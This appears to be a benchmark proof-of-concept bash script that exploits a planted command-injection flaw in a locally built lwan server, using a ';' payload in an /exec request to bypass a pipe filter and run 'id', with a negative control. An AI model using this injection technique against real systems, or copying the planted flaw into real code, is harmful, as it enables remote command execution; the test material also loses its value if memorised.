#!/usr/bin/env bash
# PoC for 171_lwan_C2I1S2
# Axes: C2 (config file gate) / I1 (direct system()) / S2 (pipe blocked, bypass ';')
#
# Gate: exec_mode and exec_logging from --exec-config file.
# S2: pipe '|' blocked; bypass with ';'. I1: direct to system().
#
# Usage: ./PoC.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/lwan"
WWWROOT="/tmp/poc_171_www"
MARKER="/tmp/poc_171_marker"
PORT=18171
NEG_PORT=19171
EXEC_CONF="/tmp/poc_171_exec.conf"

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY -- run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && {
        kill "$SERVER_PID" 2>/dev/null || true
        pkill -KILL -P "$SERVER_PID" 2>/dev/null || true
        wait "$SERVER_PID" 2>/dev/null || true
    }
    fuser -k ${PORT}/tcp 2>/dev/null || true
    rm -rf "$WWWROOT" "$MARKER" "$EXEC_CONF"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

cat > "$EXEC_CONF" <<CONFEOF
exec_mode = 1
exec_logging = 1
CONFEOF

echo "[*] starting lwan with --exec-config on port $PORT..."
"$BINARY" -r "$WWWROOT" -l "*:$PORT" --exec-config "$EXEC_CONF" &
SERVER_PID=$!
sleep 1.0

# S2 bypass: use ';' instead of '|'
echo "[*] sending payload (S2 bypass with ';'): cmd=true;id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=true;id>${MARKER}" > /dev/null || true
sleep 0.3

if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found -- exploit failed"
    exit 1
fi

# Negative control: start without --exec-config
echo "[*] verifying gate: endpoint must return 404 without --exec-config..."
kill "$SERVER_PID" 2>/dev/null || true
pkill -KILL -P "$SERVER_PID" 2>/dev/null || true
fuser -k ${PORT}/tcp 2>/dev/null || true
wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0
sleep 0.3

"$BINARY" -r "$WWWROOT" -l "*:$NEG_PORT" &
SAFE_PID=$!
sleep 1.0
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || echo "000")
kill "$SAFE_PID" 2>/dev/null || true
pkill -KILL -P "$SAFE_PID" 2>/dev/null || true
fuser -k ${NEG_PORT}/tcp 2>/dev/null || true
wait "$SAFE_PID" 2>/dev/null || true

if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-config"
else
    echo "[!] gate check: unexpected response $HTTP_CODE (expected 404)"
fi
